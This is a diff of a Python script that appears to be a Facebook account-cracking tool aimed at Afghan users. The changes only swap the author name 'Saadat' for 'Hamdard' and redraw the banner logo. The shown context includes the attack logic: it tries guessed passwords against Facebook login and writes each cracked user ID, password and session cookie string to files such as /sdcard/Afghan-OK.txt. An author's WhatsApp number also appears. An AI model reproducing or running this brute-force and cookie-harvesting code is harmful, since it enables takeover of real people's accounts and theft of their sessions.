@@ -1,6 +1,6 @@
 #coding :- utf-8
-#update by :- Saadat
-#Script Owner : Saadat Hacher 
+#update by :- Hamdard
+#Script Owner : Hamdard 
 #---------------------
 try:
 	import os,requests,time,re,random,sys,uuid,string,json,subprocess,base64,zlib,hashlib
@@ -9,30 +9,28 @@ try:
 except ModuleNotFoundError: 
 	os.system('pip install requests > /dev/null')
 	exit('\n Run Again ')
-#---------------------Saadat-LOGO---------------------#
+#---------------------Hamdard-LOGO---------------------#
 logo ='''
-z \033[1;97m .########...######..##.....##
-z \033[1;33m .##.....##.##....##.##.....##
-z \033[1;97m .##.....##.##.......##.....##
-z \033[1;32m .########...######..#########
-z \033[1;97m .##...##.........##.##.....##
-z \033[1;32m .##....##..##....##.##.....##
-z \033[1;97m .##.....##..######..##.....##
+\033[1;97m.##.....##.....##.....##
+\033[1;33m.###...###.....##.....##
+\033[1;97m.####.####.....##.....##
+\033[1;23m.##.###.##.....#########
+\033[1;97m.##.....##.....##.....##
+\033[1;23m.##.....##.###.##.....##
+\033[1;97m.##.....##.###.##.....##
 \033[1;97m--------------------------------------------------
-\033[1;91m Author     : Raziqullah Saadat 
+\033[1;91m Author     :  Hamdard
 \033[1;91m WhatsApp   : 0093702856593     
-\033[1;91m facebook   : Raziqullah
-\033[1;91m Telegram   : Saadat
+\033[1;91m facebook   : Hamdard
+\033[1;91m Telegram   : Hamdard
 \033[1;91m Status     : FREE
- \033[1;97m Raziqullah :Saadat
-            :Raziqullah Saadat
 \033[1;97m--------------------------------------------------
 '''
 loop = 0
 oks = []
 pcp=[]
 cps=[]
-#---------------------Saadat-MENU---------------------#
+#---------------------Hamdard-MENU---------------------#
 def menu():
 	os.system('clear')
 	print(logo)
@@ -46,7 +44,7 @@ def menu():
 		menu()
 	else:
 		print('\033[1;91m [•] Choose valid option\033[0;97m')
-#---------------------Saadat-RANDOM_CRACK---------------------#
+#---------------------Hamdard-RANDOM_CRACK---------------------#
 def afg_randome():
 	user=[]
 	os.system('clear')
@@ -95,14 +93,14 @@ def rndm(ids,mking_pass):
 			if 'session_key' in po:
 				uid = po['uid']
 				coki = ';'.join(i['name']+'='+i['value'] for i in po['session_cookies'])
-				print('\r\r\033[1;32m [Saadat-OK] '+str(uid)+' | '+pas+'\033[1;97m')
+				print('\r\r\033[1;32m [M.H-OK] '+str(uid)+' | '+pas+'\033[1;97m')
 				print('\r\r\033[1;32m [COOKIES] %s   '%(coki))
 				open('/sdcard/Afghan-OK.txt','a').write(str(uid)+'|'+pas+'|'+coki+'\n')
 				oks.append(str(uid))
 				break
 			elif 'www.facebook.com' in po['error']['message']:
 				uid = po['error']['error_data']['uid']
-				print('\r\r\x1b[1;33m [Saadat-CP] '+str(uid)+' | '+pas+'\033[1;97m')
+				print('\r\r\x1b[1;33m [M.H-CP] '+str(uid)+' | '+pas+'\033[1;97m')
 				open('/sdcard/Afghan-CP.txt','a').write(str(uid)+'|'+pas+'\n')
 				cps.append(str(uid))
 				break
